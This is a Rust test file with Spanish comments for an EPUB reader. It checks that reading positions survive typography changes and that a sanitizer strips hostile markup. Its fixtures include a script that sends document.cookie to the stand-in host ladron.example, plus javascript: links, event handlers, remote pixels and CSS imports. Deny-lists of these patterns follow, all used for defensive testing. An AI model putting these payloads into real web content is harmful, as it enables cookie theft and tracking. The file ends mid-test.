//! Criterio de aceptación de la.
//!
//! "Cambiar el tamaño de fuente conserva la posición de lectura y todas las
//! anotaciones; el contenido se renderiza sin ejecutar scripts ni cargar
//! recursos remotos."
//!
//! Las dos mitades son las dos promesas grandes del lector: que el trabajo del
//! usuario sobrevive a que toque la tipografía, y que abrir un libro que escribió
//! un desconocido no es abrirle la puerta.
//!
//! Contratos: `docs/architecture/reader-contracts.md` y
//! `docs/audit/threat-model.md`, sección 3.1.

use std::io::Write;
use std::path::PathBuf;

use nb_books_lib::error::NbError;
use nb_books_lib::reader::epub::{EpubDocument, EpubFactory, MEDIA_TYPE};
use nb_books_lib::reader::sanitize::sanitize;
use nb_books_lib::reader::{
    DocumentProvider, NativePosition, Precision, ProviderRegistry, Rendered,
};

struct Temporal(PathBuf);

impl Temporal {
    fn nuevo(nombre: &str) -> Self {
        let dir = nb_books_lib::paths::temporal_de_pruebas()
            .join(format!("nb-epub-{nombre}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("directorio");
        Self(dir)
    }
}

impl Drop for Temporal {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

/// Construye un EPUB con los capítulos que se le den.
fn epub(tmp: &Temporal, nombre: &str, capitulos: &[(&str, &str)]) -> PathBuf {
    epub_con(tmp, nombre, capitulos, &[])
}

/// Como [`epub`], con archivos de más que van al manifiesto y no al lomo, como un
/// `toc.ncx`.
fn epub_con(
    tmp: &Temporal,
    nombre: &str,
    capitulos: &[(&str, &str)],
    extra: &[(&str, &str, &str)],
) -> PathBuf {
    let mut entradas: Vec<(String, Vec<u8>, bool)> = vec![
        (
            "mimetype".to_owned(),
            b"application/epub+zip".to_vec(),
            false,
        ),
        (
            "META-INF/container.xml".to_owned(),
            br#"<?xml version="1.0"?><container version="1.0"
                 xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles>
                 <rootfile full-path="OEBPS/content.opf"
                 media-type="application/oebps-package+xml"/></rootfiles></container>"#
                .to_vec(),
            true,
        ),
    ];

    let items: String = capitulos
        .iter()
        .enumerate()
        .map(|(i, (archivo, _))| {
            format!(r#"<item id="c{i}" href="{archivo}" media-type="application/xhtml+xml"/>"#)
        })
        .chain(extra.iter().enumerate().map(|(i, (archivo, tipo, _))| {
            format!(r#"<item id="x{i}" href="{archivo}" media-type="{tipo}"/>"#)
        }))
        .collect();
    let refs: String = (0..capitulos.len())
        .map(|i| format!(r#"<itemref idref="c{i}"/>"#))
        .collect();

    entradas.push((
        "OEBPS/content.opf".to_owned(),
        format!(
            r#"<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0">
               <metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:title>Un libro</dc:title></metadata>
               <manifest>{items}</manifest><spine>{refs}</spine></package>"#
        )
        .into_bytes(),
        true,
    ));

    for (archivo, _, contenido) in extra {
        entradas.push((
            format!("OEBPS/{archivo}"),
            contenido.as_bytes().to_vec(),
            true,
        ));
    }

    for (archivo, cuerpo) in capitulos {
        entradas.push((
            format!("OEBPS/{archivo}"),
            format!(
                r#"<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><body>{cuerpo}</body></html>"#
            )
            .into_bytes(),
            true,
        ));
    }

    let mut salida = Vec::new();
    let mut central = Vec::new();
    let mut cuantas = 0_u16;

    for (nombre_entrada, contenido, comprimir) in &entradas {
        let offset = u32::try_from(salida.len()).expect("cabe");
        let datos = if *comprimir {
            let mut cod =
                flate2::write::DeflateEncoder::new(Vec::new(), flate2::Compression::fast());
            cod.write_all(contenido).expect("comprime");
            cod.finish().expect("comprime")
        } else {
            contenido.clone()
        };
        let metodo: u16 = if *comprimir { 8 } else { 0 };
        let comp = u32::try_from(datos.len()).expect("cabe");
        let desc = u32::try_from(contenido.len()).expect("cabe");
        let nb = nombre_entrada.as_bytes();

        salida.extend_from_slice(&[0x50, 0x4b, 0x03, 0x04]);
        salida.extend_from_slice(&[20, 0, 0, 0]);
        salida.extend_from_slice(&metodo.to_le_bytes());
        salida.extend_from_slice(&[0; 8]);
        salida.extend_from_slice(&comp.to_le_bytes());
        salida.extend_from_slice(&desc.to_le_bytes());
        salida.extend_from_slice(&u16::try_from(nb.len()).expect("cabe").to_le_bytes());
        salida.extend_from_slice(&[0, 0]);
        salida.extend_from_slice(nb);
        salida.extend_from_slice(&datos);

        central.extend_from_slice(&[0x50, 0x4b, 0x01, 0x02]);
        central.extend_from_slice(&[20, 0, 20, 0, 0, 0]);
        central.extend_from_slice(&metodo.to_le_bytes());
        central.extend_from_slice(&[0; 8]);
        central.extend_from_slice(&comp.to_le_bytes());
        central.extend_from_slice(&desc.to_le_bytes());
        central.extend_from_slice(&u16::try_from(nb.len()).expect("cabe").to_le_bytes());
        central.extend_from_slice(&[0; 12]);
        central.extend_from_slice(&offset.to_le_bytes());
        central.extend_from_slice(nb);
        cuantas += 1;
    }

    let offset_central = u32::try_from(salida.len()).expect("cabe");
    let tamano_central = u32::try_from(central.len()).expect("cabe");
    salida.extend_from_slice(&central);
    salida.extend_from_slice(&[0x50, 0x4b, 0x05, 0x06]);
    salida.extend_from_slice(&[0; 4]);
    salida.extend_from_slice(&cuantas.to_le_bytes());
    salida.extend_from_slice(&cuantas.to_le_bytes());
    salida.extend_from_slice(&tamano_central.to_le_bytes());
    salida.extend_from_slice(&offset_central.to_le_bytes());
    salida.extend_from_slice(&[0, 0]);

    let ruta = tmp.0.join(nombre);
    std::fs::write(&ruta, salida).expect("epub");
    ruta
}

fn libro(tmp: &Temporal, nombre: &str) -> EpubDocument {
    let ruta = epub(
        tmp,
        nombre,
        &[
            ("c1.xhtml", "<p>Muchos años después, frente al pelotón de fusilamiento, el coronel Aureliano Buendía había de recordar aquella tarde remota.</p>"),
            ("c2.xhtml", "<p>Macondo era entonces una aldea de veinte casas de barro y cañabrava construidas a la orilla de un río de aguas diáfanas.</p>"),
        ],
    );
    EpubDocument::open(&ruta).expect("epub abierto")
}

fn en(href: &str, offset: u32) -> NativePosition {
    NativePosition::Fragment {
        href: href.to_owned(),
        offset,
    }
}

// --- Primera mitad: la tipografía no mueve nada -----------------------------

/// **Primera mitad del criterio.**
///
/// La demostración es estructural y por eso vale: la tipografía **no es una
/// entrada de este proveedor**. Sus coordenadas son desplazamientos en el texto
/// del documento, que no cambia porque alguien agrande la letra, y nunca números
/// de página, que sí cambiarían.
#[test]
fn la_posicion_no_depende_de_la_tipografia_porque_no_la_conoce() {
    let tmp = Temporal::nuevo("tipografia");
    let doc = libro(&tmp, "libro.epub");

    // Un formato reflowable no tiene páginas, y aceptarlas sería aceptar el
    // modelo que ADR-004 descarta con otro nombre.
    assert_eq!(
        doc.locator_at(&NativePosition::Page(1)),
        Err(NbError::PathNotAllowed)
    );
    assert!(doc.capabilities().reflow);
    assert!(doc.capabilities().typography);

    let locator = doc.locator_at(&en("OEBPS/c1.xhtml", 30)).expect("locator");

    // Nada del locator depende de la maquetación: ni píxeles, ni páginas, ni
    // líneas. Solo el recurso, el desplazamiento en el texto, la progresión y la
    // cita.
    assert_eq!(locator.locations.position, None, "un EPUB no tiene página");
    assert_eq!(locator.locations.fragments, vec!["#char=30".to_owned()]);
    assert!(locator.text.is_some());

    // Y se puede volver a él tantas veces como se quiera, siempre al mismo sitio.
    for _ in 0..3 {
        let resolucion = doc.resolve(&locator).expect("resolución");
        assert_eq!(resolucion.precision, Precision::Exact);
        assert_eq!(resolucion.position, en("OEBPS/c1.xhtml", 30));
    }
}

/// El mismo libro, abierto en dos sesiones distintas —que es lo que ocurre al
/// cambiar la tipografía y reabrir—, devuelve locators idénticos.
#[test]
fn dos_sesiones_del_mismo_libro_producen_los_mismos_locators() {
    let tmp = Temporal::nuevo("sesiones");
    let ruta = epub(
        &tmp,
        "libro.epub",
        &[(
            "c1.xhtml",
            "<p>Un texto cualquiera para situar una anotación.</p>",
        )],
    );

    let primera = EpubDocument::open(&ruta).expect("abierto");
    let segunda = EpubDocument::open(&ruta).expect("abierto otra vez");

    for offset in [0, 5, 20] {
        assert_eq!(
            primera
                .locator_at(&en("OEBPS/c1.xhtml", offset))
                .expect("a"),
            segunda
                .locator_at(&en("OEBPS/c1.xhtml", offset))
                .expect("b"),
            "el locator de {offset} cambió entre sesiones"
        );
    }
}

/// El espacio en blanco del marcado no es contenido. Si lo fuera, reindentar el
/// archivo movería todas las anotaciones del libro.
#[test]
fn la_indentacion_del_marcado_no_mueve_las_anotaciones() {
    let tmp = Temporal::nuevo("indentacion");
    let apretado = EpubDocument::open(&epub(
        &tmp,
        "apretado.epub",
        &[("c1.xhtml", "<p>Uno dos tres cuatro cinco.</p>")],
    ))
    .expect("abierto");
    let suelto = EpubDocument::open(&epub(
        &tmp,
        "suelto.epub",
        &[(
            "c1.xhtml",
            "<p>\n    Uno   dos\n\n  tres    cuatro\n cinco.\n  </p>",
        )],
    ))
    .expect("abierto");

    let a = apretado.locator_at(&en("OEBPS/c1.xhtml", 8)).expect("a");
    let b = suelto.locator_at(&en("OEBPS/c1.xhtml", 8)).expect("b");

    assert_eq!(
        a.text.as_ref().map(|t| &t.highlight),
        b.text.as_ref().map(|t| &t.highlight),
        "la cita no puede depender de cómo indentó el archivo su generador"
    );
}

// --- Segunda mitad: nada de scripts ni de recursos remotos ------------------

/// **Segunda mitad del criterio.** Un EPUB es HTML que escribió un desconocido y
/// el webview lo va a ejecutar.
#[test]
fn el_contenido_se_pinta_sin_scripts_y_sin_recursos_remotos() {
    let tmp = Temporal::nuevo("hostil");
    let hostil = r##"
        <p>Texto legítimo del libro.</p>
        <script>fetch('https://ladron.example/?c='+document.cookie)</script>
        <p onclick="alert(1)" onmouseover="robar()">Con manejadores.</p>
        <img src="https://ladron.example/pixel.gif" alt="rastreador"/>
        <img src="imagenes/portada.png" alt="portada legítima"/>
        <a href="https://ladron.example/">Fuera</a>
        <a href="javascript:alert(1)">Peor</a>
        <a href="c2.xhtml">Dentro</a>
        <a href="#nota1">Ancla</a>
        <iframe src="https://ladron.example/"></iframe>
        <style>@import url('https://ladron.example/x.css'); p{color:red}</style>
        <object data="malo.swf"></object>
        <p style="background:url(https://ladron.example/x.png)">Con estilo.</p>
        <svg><script>alert(1)</script></svg>
        <img src="data:image/svg+xml,&lt;svg onload=alert(1)&gt;"/>
    "##;

    let doc =
        EpubDocument::open(&epub(&tmp, "hostil.epub", &[("c1.xhtml", hostil)])).expect("abierto");
    let html = doc.markup("OEBPS/c1.xhtml").expect("marcado");
    let minusculas = html.to_lowercase();

    // Nada que ejecute.
    for prohibido in [
        "<script",
        "javascript:",
        "onclick",
        "onmouseover",
        "onload",
        "<iframe",
        "<object",
        "<embed",
    ] {
        assert!(
            !minusculas.contains(prohibido),
            "quedó {prohibido} en el marcado:\n{html}"
        );
    }
    // Nada que salga a la red.
    assert!(
        !minusculas.contains("ladron.example"),
        "quedó una referencia remota:\n{html}"
    );
    assert!(
        !minusculas.contains("data:"),
        "quedó un recurso en línea:\n{html}"
    );
    assert!(
        !minusculas.contains("@import"),
        "quedó un import de CSS:\n{html}"
    );
    assert!(
        !minusculas.contains("style="),
        "quedó un atributo de estilo:\n{html}"
    );

    // Y lo legítimo sobrevive: sanear no es vaciar.
    assert!(html.contains("Texto legítimo del libro."));
    assert!(html.contains("Con manejadores."));
    assert!(
        html.contains("imagenes/portada.png"),
        "la imagen interna se conserva"
    );
    assert!(html.contains("c2.xhtml"), "el enlace interno se conserva");
    assert!(html.contains("#nota1"), "el ancla se conserva");
}

/// El contenido de un `script` no se queda suelto en la página.
#[test]
fn el_texto_de_un_script_no_acaba_como_texto_del_libro() {
    let saneado =
        sanitize("<p>Antes</p><script>var secreto = 42;</script><p>Después</p>").expect("saneado");

    assert!(!saneado.html.contains("secreto"), "{}", saneado.html);
    assert!(!saneado.html.contains("42"), "{}", saneado.html);
    assert!(saneado.html.contains("Antes"));
    assert!(saneado.html.contains("Después"));
    assert_eq!(saneado.report.blocks_dropped, 1);
}

/// Un elemento desconocido pierde su etiqueta pero no se lleva el texto: un
/// `<font>` antiguo no puede hacer desaparecer un párrafo.
#[test]
fn un_elemento_desconocido_pierde_la_etiqueta_pero_no_el_texto() {
    let saneado =
        sanitize("<p>Antes <font color=\"red\">en medio</font> después</p>").expect("saneado");

    assert!(!saneado.html.contains("<font"), "{}", saneado.html);
    assert!(saneado.html.contains("en medio"), "{}", saneado.html);
    assert_eq!(saneado.report.elements_dropped, 1);
}

/// El texto se escapa al reinsertarlo: si no, un `<` del libro se convertiría en
/// una etiqueta que nadie escribió.
#[test]
fn el_texto_del_libro_se_escapa_al_reinsertarlo() {
    let saneado =
        sanitize("<p>Un ejemplo con &lt;script&gt; escrito como texto</p>").expect("saneado");

    assert!(saneado.html.contains("&lt;script&gt;"), "{}", saneado.html);
    assert!(!saneado.html.contains("<script"), "{}", saneado.html);
}

// --- Lo demás del contrato --------------------------------------------------

#[test]
fn el_lomo_marca_el_orden_de_lectura_y_la_navegacion_lo_refleja() {
    let tmp = Temporal::nuevo("orden");
    let doc = libro(&tmp, "libro.epub");

    assert_eq!(doc.spine(), vec!["OEBPS/c1.xhtml", "OEBPS/c2.xhtml"]);

    let navegacion = doc.navigation().expect("navegación");
    assert_eq!(navegacion.entries.len(), 2);
    assert_eq!(navegacion.entries[0].locator.href, "OEBPS/c1.xhtml");
    assert_eq!(navegacion.entries[1].locator.href, "OEBPS/c2.xhtml");
}

/// La progresión total recorre el libro entero, no cada capítulo por separado:
/// es lo que permite decir "vas por el 40 % del libro" y no "del capítulo".
#[test]
fn la_progresion_total_recorre_el_libro_entero() {
    let tmp = Temporal::nuevo("progresion");
    let doc = libro(&tmp, "libro.epub");

    let principio = doc.locator_at(&en("OEBPS/c1.xhtml", 0)).expect("locator");
    let segundo = doc.locator_at(&en("OEBPS/c2.xhtml", 0)).expect("locator");

    assert_eq!(principio.locations.total_progression, Some(0.0));
    assert_eq!(principio.locations.progression, Some(0.0));

    let total = segundo.locations.total_progression.expect("total");
    assert!(
        total > 0.4 && total < 0.6,
        "el segundo capítulo empieza sobre la mitad: {total}"
    );
    assert_eq!(
        segundo.locations.progression,
        Some(0.0),
        "pero es el principio de su propio recurso"
    );
}

#[test]
fn el_texto_extraido_no_lleva_marcado() {
    let tmp = Temporal::nuevo("texto");
    let doc = libro(&tmp, "libro.epub");
    let locator = doc.locator_at(&en("OEBPS/c1.xhtml", 0)).expect("locator");

    let texto = doc.text_range(&locator, 13).expect("texto");

    assert_eq!(texto, "Muchos años d");
    assert!(!texto.contains('<'));
}

#[test]
fn lo_que_se_pinta_es_marcado_y_no_una_imagen() {
    let tmp = Temporal::nuevo("render");
    let doc = libro(&tmp, "libro.epub");

    let pintado = doc.render(&en("OEBPS/c1.xhtml", 0)).expect("render");

    let Rendered::Markup {
        html, media_type, ..
    } = pintado
    else {
        panic!("un EPUB se pinta como marcado, no como imagen");
    };
    assert_eq!(media_type, "application/xhtml+xml");
    assert!(html.contains("Aureliano"));
}

#[test]
fn se_registra_por_su_tipo_de_medio() {
    let tmp = Temporal::nuevo("registro");
    let ruta = epub(&tmp, "libro.epub", &[("c1.xhtml", "<p>Contenido</p>")]);

    let mut registro = ProviderRegistry::new();
    registro.register(Box::new(EpubFactory::solo_texto()));

    let doc = registro.open(MEDIA_TYPE, &ruta).expect("abierto");
    assert_eq!(doc.media_type(), MEDIA_TYPE);
    assert!(doc.capabilities().reflow);
}

/// Un capítulo que no se deja leer no puede tumbar el libro entero: no se puede
/// impedir abrir cuatrocientas páginas porque una esté mal.
#[test]
fn un_libro_sin_ningun_recurso_legible_se_rechaza_pero_uno_con_alguno_se_abre() {
    let tmp = Temporal::nuevo("parcial");

    let vacio = epub(&tmp, "vacio.epub", &[]);
    assert_eq!(
        EpubDocument::open(&vacio).err(),
        Some(NbError::DocumentCorrupted)
    );

    let doc = EpubDocument::open(&epub(
        &tmp,
        "uno.epub",
        &[("c1.xhtml", "<p>El único capítulo legible.</p>")],
    ))
    .expect("un capítulo basta");
    assert_eq!(doc.spine().len(), 1);
}

// --- Anclar lo que el usuario acaba de seleccionar -----------------

/// La cita se **busca en el documento** en lugar de creérsela.
///
/// La selección la produce el webview, que es zona no confiable, y la cita es lo
/// que sostiene el segundo escalón de la cascada de ADR-004. Un locator con una
/// cita que no está en el libro no se podría reanclar nunca, y el usuario no lo
/// sabría hasta perder la anotación.
#[test]
fn una_cita_seleccionada_se_ancla_donde_de_verdad_esta() {
    let tmp = Temporal::nuevo("cita");
    let doc = libro(&tmp, "libro.epub");

    let locator = doc
        .locator_for_quote("aldea de veinte casas", None)
        .expect("la cita está en el segundo capítulo");

    assert_eq!(locator.href, "OEBPS/c2.xhtml");
    let contexto = locator.text.as_ref().expect("la cita viaja con el locator");
    assert_eq!(contexto.highlight, "aldea de veinte casas");
    assert!(
        contexto.before.is_some() && contexto.after.is_some(),
        "el contexto es lo que permite desempatar al reanclar"
    );

    // Y lo que se ancló resuelve exactamente: si no, el anclaje sería una
    // promesa que la primera apertura ya rompería.
    let resolucion = doc.resolve(&locator).expect("resuelve");
    assert_eq!(resolucion.precision, Precision::Exact);
}

/// Una cita que no está en el documento no produce un locator inventado.
#[test]
fn una_cita_que_no_esta_en_el_libro_no_se_ancla() {
    let tmp = Temporal::nuevo("cita-ausente");
    let doc = libro(&tmp, "libro.epub");

    assert_eq!(
        doc.locator_for_quote("esto no lo dice el libro", None),
        Err(NbError::DocumentNotFound)
    );
}

/// Una cita vacía encontraría cualquier punto del documento.
#[test]
fn una_cita_vacia_se_rechaza_antes_de_buscarla() {
    let tmp = Temporal::nuevo("cita-vacia");
    let doc = libro(&tmp, "libro.epub");

    assert_eq!(
        doc.locator_for_quote("   ", None),
        Err(NbError::PathNotAllowed)
    );
}

/// Una frase repetida ancla donde el usuario estaba, no en la primera aparición.
///
/// Sin este desempate, seleccionar una frase corriente en el capítulo veinte
/// pondría la anotación en el capítulo uno, y quien la abriese se encontraría
/// leyendo otra cosa.
#[test]
fn una_frase_repetida_ancla_a_la_aparicion_mas_cercana_a_donde_se_lee() {
    let tmp = Temporal::nuevo("repetida");
    let ruta = epub(
        &tmp,
        "libro.epub",
        &[
            ("c1.xhtml", "<p>Al principio del libro se dice la misma frase repetida y nada más.</p>"),
            ("c2.xhtml", "<p>Un capítulo de relleno que solo existe para separar los dos extremos del libro.</p>"),
            ("c3.xhtml", "<p>Y al final del libro vuelve a aparecer la misma frase repetida, ya en otro sitio.</p>"),
        ],
    );
    let doc = EpubDocument::open(&ruta).expect("epub abierto");

    let al_principio = doc
        .locator_for_quote("la misma frase repetida", Some(0.0))
        .expect("ancla");
    let al_final = doc
        .locator_for_quote("la misma frase repetida", Some(1.0))
        .expect("ancla");

    assert_eq!(al_principio.href, "OEBPS/c1.xhtml");
    assert_eq!(al_final.href, "OEBPS/c3.xhtml");
}

/// Un EPUB no se pinta como imagen, así que no tiene tamaño de página.
///
/// Lo dice en lugar de devolver un tamaño cualquiera: con un tamaño inventado la
/// interfaz reservaría un hueco que no corresponde a nada.
#[test]
fn un_formato_que_reflue_no_tiene_tamano_de_pagina_ni_capa_que_superponer() {
    let tmp = Temporal::nuevo("sin-pagina");
    let doc = libro(&tmp, "libro.epub");

    assert_eq!(
        doc.page_size(&en("OEBPS/c1.xhtml", 0)),
        Err(NbError::FormatUnsupported)
    );
    assert_eq!(
        doc.text_layer(&en("OEBPS/c1.xhtml", 0)),
        Err(NbError::FormatUnsupported)
    );
}

/// **Regresión.** La cita llega del webview con el espaciado del marcado dentro.
///
/// Un párrafo escrito en varias líneas en el XHTML se ve como una línea, pero su
/// texto tiene los saltos y la indentación. El texto del documento está
/// normalizado, así que sin normalizar también la cita, ese párrafo no se
/// encontraría **nunca** y no se podría anotar: el defecto habría afectado a
/// casi todos los EPUB reales, que vienen indentados.
#[test]
fn una_cita_con_el_espaciado_del_marcado_se_ancla_igual() {
    let tmp = Temporal::nuevo("espaciado");
    let ruta = epub(
        &tmp,
        "libro.epub",
        &[(
            "c1.xhtml",
            "<p>\n    Muchos   años\n\n  después,\n  frente al pelotón.\n  </p>",
        )],
    );
    let doc = EpubDocument::open(&ruta).expect("epub abierto");

    let locator = doc
        .locator_for_quote("Muchos   años\n\n  después,", None)
        .expect("la cita se encuentra pese al espaciado");

    let contexto = locator.text.as_ref().expect("cita");
    // Y lo que se guarda es el texto **del documento**, ya normalizado, no la
    // cadena que mandó el webview: es lo que la siguiente resolución buscará.
    assert_eq!(contexto.highlight, "Muchos años después,");
    assert_eq!(
        doc.resolve(&locator).expect("resuelve").precision,
        Precision::Exact
    );
}

/// Seleccionar varios párrafos seguidos produce una cita que ancla.
///
/// Es el caso normal de una nota sobre una idea que ocupa más de un párrafo, y
/// el que rompería si los bloques se unieran con un separador distinto del que
/// usa el texto del documento.
#[test]
fn una_seleccion_de_varios_parrafos_ancla_al_primero() {
    let tmp = Temporal::nuevo("varios-parrafos");
    let ruta = epub(
        &tmp,
        "libro.epub",
        &[(
            "c1.xhtml",
            "<p>Primer párrafo de la idea.</p><p>Segundo párrafo de la idea.</p>",
        )],
    );
    let doc = EpubDocument::open(&ruta).expect("epub abierto");

    // La interfaz une los bloques con un espacio, que es como el documento los
    // separa una vez normalizado.
    let locator = doc
        .locator_for_quote(
            "Primer párrafo de la idea. Segundo párrafo de la idea.",
            None,
        )
        .expect("los dos párrafos juntos anclan");

    assert_eq!(
        doc.resolve(&locator).expect("resuelve").precision,
        Precision::Exact
    );
}

/// **El criterio de aceptación: todo fragmento puede abrir su posición
/// exacta en el documento.**
///
/// Para cada fragmento del troceado, su locator resuelve **exacto** —no por cita
/// ni por aproximación— y el texto que hay en esa posición, con la longitud del
/// fragmento, **es** el fragmento. Con varios tamaños, porque el corte cambia con
/// el tamaño y cada corte produce locators distintos.
///
/// Y la otra mitad del criterio: con párrafos más cortos que la mitad del
/// tamaño, **ningún fragmento parte un párrafo**. Cada párrafo acaba en "Fin N.", y
/// dentro lleva frases que también acaban en punto, así que un corte por frase o
/// por espacio no se confundiría con uno por párrafo.
#[test]
fn todo_fragmento_abre_su_posicion_exacta_y_no_parte_un_parrafo() {
    let tmp = Temporal::nuevo("fragmentos");
    let parrafos = |capitulo: usize| -> String {
        (0..40)
            .map(|n| {
                let relleno = "palabra ".repeat(3 + (n * 7 + capitulo) % 9);
                format!("<p>Frase {n}. Otra frase con {relleno}dentro. Fin {n}.</p>")
            })
            .collect()
    };
    let ruta = epub(
        &tmp,
        "parrafos.epub",
        &[
            ("c1.xhtml", &format!("<h1>Capítulo uno</h1>{}", parrafos(1))),
            (
                "c2.xhtml",
                &format!(
                    "<h1>Capítulo dos</h1><ul><li>uno</li><li>dos</li></ul>{}",
                    parrafos(2)
                ),
            ),
        ],
    );
    let doc = EpubDocument::open(&ruta).expect("abierto");

    for maximo in [60, 200, 500, 1920] {
        let fragmentos = doc.text_chunks(maximo).expect("fragmentos");
        assert!(!fragmentos.is_empty());
        for (i, (locator, texto)) in fragmentos.iter().enumerate() {
            let resolucion = doc.resolve(locator).expect("resuelve");
            assert_eq!(
                resolucion.precision,
                Precision::Exact,
                "el fragmento {i} con máximo {maximo} no resolvió exacto"
            );
            let largo = texto.chars().count();
            assert!(largo <= maximo);
            assert_eq!(
                &doc.text_range(locator, largo).expect("texto"),
                texto,
                "el fragmento {i} con máximo {maximo} no abre donde está su texto"
            );
        }

        // Los párrafos miden como mucho unos 110 caracteres: con 500 y 1.920, cada
        // fragmento que no es el último de su capítulo acaba en un final de párrafo.
        if maximo >= 500 {
            let sin_ultimo_de_capitulo: Vec<&(nb_books_lib::reader::Locator, String)> = fragmentos
                .windows(2)
                .filter(|par| par[0].0.href == par[1].0.href)
                .map(|par| &par[0])
                .collect();
            assert!(!sin_ultimo_de_capitulo.is_empty());
            for (_, texto) in sin_ultimo_de_capitulo {
                let final_ = texto.trim_end();
                let acaba_en_parrafo = final_.rsplit_once("Fin ").is_some_and(|(_, cola)| {
                    cola.trim_end_matches('.')
                        .chars()
                        .all(|c| c.is_ascii_digit())
                });
                assert!(
                    acaba_en_parrafo,
                    "con máximo {maximo} un fragmento partió un párrafo"
                );
            }
        }
    }
}

// --- Las fórmulas se leen ------------------------------------------

fn fixture(nombre: &str) -> String {
    std::fs::read_to_string(
        std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("tests/fixtures")
            .join(nombre),
    )
    .expect("el archivo del corpus de pruebas")
}

/// **El criterio, primera mitad.** Antes el saneador
/// quitaba cada etiqueta de MathML y conservaba su texto: la fórmula general
/// llegaba como `x=−b±b2−4ac2a`.
///
/// La salida se compara **entera** con `formula.saneada.html`, que es también el
/// capítulo que pinta el recorrido de `e2e/flujo.spec.ts`: lo que se comprueba que
/// se pinta es exactamente lo que el runtime entrega.
#[test]
fn una_formula_de_mathml_llega_entera_al_lector() {
    let saneado = sanitize(&fixture("formula.xhtml")).expect("saneable");
    assert_eq!(
        saneado.html,
        fixture("formula.saneada.html"),
        "si el saneador cambia lo que entrega, cambia también lo que pinta la interfaz"
    );
    for pieza in [
        "<math display=\"block\"",
        "<mfrac>",
        "<msqrt>",
        "<mtable",
        "<msup>",
    ] {
        assert!(saneado.html.contains(pieza), "falta {pieza}");
    }
    assert_eq!(
        saneado.report.elements_dropped, 0,
        "no se pierde ni una pieza"
    );

    // Y por el camino de verdad: un EPUB que la trae, abierto por el lector.
    let tmp = Temporal::nuevo("formula");
    let capitulo = fixture("formula.xhtml");
    let dentro = capitulo
        .split_once("<body>")
        .and_then(|(_, resto)| resto.split_once("</body>"))
        .map(|(cuerpo, _)| cuerpo.to_owned())
        .expect("el capítulo tiene cuerpo");
    let doc =
        EpubDocument::open(&epub(&tmp, "formula.epub", &[("c1.xhtml", &dentro)])).expect("abierto");
    let html = doc.markup("OEBPS/c1.xhtml").expect("marcado");
    assert!(
        html.contains("<mfrac>"),
        "el lector entrega la fracción:\n{html}"
    );
}

/// **La segunda mitad.** Admitir MathML no puede abrir una puerta: lo que no es
/// una fórmula dentro de una fórmula se sigue rechazando.
#[test]
fn dentro_de_una_formula_se_sigue_rechazando_lo_que_no_es_formula() {
    let hostil = r##"<p>Antes.</p>
        <math xmlns="http://www.w3.org/1998/Math/MathML">
          <mi onclick="robar()">x</mi>
          <script>alert(1)</script>
          <mi href="javascript:alert(1)">y</mi>
          <mi href="https://ladron.example/">z</mi>
          <mglyph src="https://ladron.example/pixel.png" alt="rastreador"/>
          <semantics>
            <mn>1</mn>
            <annotation-xml encoding="text/html"><img src="x" onerror="alert(1)"/><p>marcado ajeno</p></annotation-xml>
            <annotation-xml encoding="application/xhtml+xml"><style>@import url(https://ladron.example/x.css)</style></annotation-xml>
          </semantics>
          <mstyle style="background:url(https://ladron.example/x.png)" mathcolor="red"><mn>2</mn></mstyle>
          <maction actiontype="statusline"><mi>w</mi><mtext>engaño</mtext></maction>
        </math>"##;
    let saneado = sanitize(hostil).expect("saneable");
    let html = saneado.html.to_lowercase();

    for prohibido in [
        "<script",
        "onclick",
        "onerror",
        "javascript:",
        "ladron.example",
        "<mglyph",
        "annotation-xml",
        "marcado ajeno",
        "<img",
        "<style",
        "@import",
        "style=",
        "actiontype",
    ] {
        assert!(!html.contains(prohibido), "quedó {prohibido}:\n{html}");
    }
    // Lo legítimo de la fórmula sigue: sanear no es vaciar.
    assert!(html.contains("<math>"));
    assert!(html.contains("<mi>x</mi>"));
    assert!(html.contains("mathcolor=\"red\""));
    assert!(html.contains("<mn>1</mn>"));
}

/// Los atributos de una fórmula solo valen dentro de una fórmula: un `display`
/// en un párrafo no tiene por qué llegar al webview.
#[test]
fn los_atributos_de_formula_no_pasan_fuera_de_una_formula() {
    let saneado = sanitize(r#"<p display="block" mathvariant="bold">Texto</p>"#).expect("saneable");
    assert_eq!(saneado.html, "<p>Texto</p>");
}

// --- Las ilustraciones vectoriales se ven -------------------------

/// **El criterio, la rama que se eligió: admitir un subconjunto
/// acotado.** Antes el saneador quitaba todo `<svg>` sin decirlo en
/// ningún contrato, y con él la portada de los libros que la componen como un
/// dibujo con la imagen dentro.
#[test]
fn una_ilustracion_vectorial_llega_entera_al_lector() {
    let saneado = sanitize(&fixture("ilustracion.xhtml")).expect("saneable");
    assert_eq!(
        saneado.html,
        fixture("ilustracion.saneada.html"),
        "si el saneador cambia lo que entrega, cambia también lo que pinta la interfaz"
    );
    assert_eq!(saneado.report.elements_dropped, 0);
    assert_eq!(saneado.report.remote_references_dropped, 0);
    for pieza in [
        "<svg viewbox=",
        "<lineargradient id=\"cielo\"",
        "</lineargradient>",
        "fill=\"url(#cielo)\"",
        "marker-end=\"url(#punta)\"",
        ">Mar</text>",
    ] {
        assert!(saneado.html.contains(pieza), "falta {pieza}");
    }
}

/// La imagen de dentro de un dibujo se resuelve como la de un `img`: es un archivo
/// del libro que el webview no puede leer dentro del contenedor.
#[test]
fn la_imagen_de_un_dibujo_se_pide_por_el_mismo_camino_que_la_de_un_img() {
    let saneado = nb_books_lib::reader::sanitize::sanitize_with(
        r#"<svg><image xlink:href="imagenes/portada.jpg" width="600" height="800"/></svg>"#,
        |ruta| (ruta == "imagenes/portada.jpg").then(|| "/cache/recursos/portada.jpg".to_owned()),
    )
    .expect("saneable");
    assert!(
        saneado
            .html
            .contains(r#"href="/cache/recursos/portada.jpg""#),
        "{}",
        saneado.html
    );
}

/// Lo que se saca del subconjunto, **con una prueba por cada exclusión**, que es
/// lo que pide la ficha. Cada caso es un dibujo legítimo más una sola cosa que no
/// puede pasar, para que un fallo diga cuál.
#[test]
fn cada_exclusion_del_dibujo_tiene_su_prueba() {
    let casos: &[(&str, &str, &[&str])] = &[
        (
            "script dentro del dibujo",
